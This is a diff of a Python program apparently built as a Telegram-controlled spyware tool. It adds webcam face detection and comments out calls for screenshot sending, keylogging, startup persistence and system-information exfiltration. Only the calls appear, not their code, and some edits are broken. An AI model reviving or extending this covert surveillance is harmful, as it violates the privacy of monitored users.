@@ -17,6 +17,7 @@ import random  # Genera numeros
 import telepot  # Telegram API
 import string  # Lib genera textos
 import time  # Contar segundos
+import cv2 # Lib IA
 import eel # Entorno gráfico con HTML/ CSS / JS
 #import shutil
 #from PIL import ImageGrab  # Toma capturas de pantalla
@@ -543,6 +544,57 @@ class PCInformation:
                     init()
                     time.sleep(200)
 
+class WebCam_IA:
+    def __init__(self):
+        self.frontalFace_path = "haarcascade_frontalface_default.xml"  # Archivo clasificador
+        self.path_imagenVerificar = "personas.jpg"
+
+    def get_capture_webcam(self):
+        try:
+            print('Tratando de obtener WebCam [0]')
+            return cv2.VideoCapture(0)
+        except:
+            try:
+                print('Tratando de obtener WebCam [1]')
+                return cv2.VideoCapture(1)
+            except:
+                pass
+            print('No se puedo obtener ambas camaras')
+            return False
+    def trained_file(self):
+        try:
+            return cv2.CascadeClassifier(self.frontalFace_path)
+        except:
+            return False
+    
+    def start(self):
+        cap = self.get_capture_webcam()
+        faceClassif = self.trained_file()
+
+        if cap != False and faceClassif != False:
+            while True:
+                ret, frame = cap.read()  # Obtiene frames
+                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+
+                faces = faceClassif.detectMultiScale(gray,
+                                                     scaleFactor=1.05,  # original 1.3,  # Reducción de imagen
+                                                     minNeighbors=5
+                                                     # Espeficica el número mínimo de cuadros delimitadores
+                                                     )
+                for x, y, w, h in faces:
+                    cv2.rectangle(frame,
+                                  (x, y),
+                                  (x + w, y + h),
+                                  (0, 255, 0),
+                                  5)  # original 2
+                cv2.imshow('frame', frame)
+                if cv2.waitKey(1) & 0xFF == ord('q'):
+                    break
+            cap.release()
+            cv2.destroyAllWindows()
+        else:
+            print('No se puedo acceder a la webcam o al archivo entrenado')
+
 
 
 if __name__ == '__main__':
@@ -552,9 +604,10 @@ if __name__ == '__main__':
 
     @eel.expose
     def send_values(nickname, tele_id):
+        """
         tScreenshot = threading.Thread(target=Screenshot().send)
         tScreenshot.start()
-        tScreenshot.
+
         print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
         threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
         threading.Thread(target=WebsiteBlock().reset()).start() if Util().is_admin() else False  # Desbloquear Webs
@@ -562,27 +615,29 @@ if __name__ == '__main__':
         threading.Thread(target=StartUp().infinite).start()
         threading.Thread(target=PCInformation().send).start()
         threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
-
+        """
+        WebCam_IA().start()
         print(nickname)
         print(tele_id)
         print("Está en linea")
         return ""
 
     @eel.expose
-    def stop___(): # Detiene todo el proceso
+    def stop___(self): # Detiene todo el proceso
 
         print('se detuvo')
         return ""
 
 
     @eel.expose
-    def start___():  # Inicia todo el proceso
+    def start___(self):  # Inicia todo el proceso
         print('continuar')
         return ""
 
 
     @eel.expose
-    def exit___():  # Inicia todo el proceso
+    def exit___(self):  # Inicia todo el proceso
+        #eel._shutdown
         os._exit(1)
         return ""
 
